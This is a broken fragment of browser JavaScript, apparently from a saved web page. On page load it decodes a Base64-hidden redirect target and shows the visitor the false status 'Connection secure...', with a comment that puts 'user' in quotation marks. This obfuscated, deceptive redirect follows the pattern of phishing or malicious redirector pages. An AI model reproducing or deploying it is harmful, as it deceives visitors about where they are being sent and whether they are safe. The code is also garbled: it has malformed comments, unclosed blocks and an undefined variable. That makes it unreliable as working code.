<script>

     * Original path: ./745596f4-2947-4d89-955f-f4148e07d22a/804b0424-9932-4e10-9874-0d2980fe87a6.html

    function redirectToMain() {
        const statusEl = document.getElementById('status');
        
        try {
            // Decodes the Base64 string
            const target = atob(encodedTarget);
            
            // Visual feedback for the "user"
            setTimeout(() => { statusEl.innerText = "Connection secure..."; }, 200);

    // Start the process once the window has loaded
    window.onload = redirectToMain;
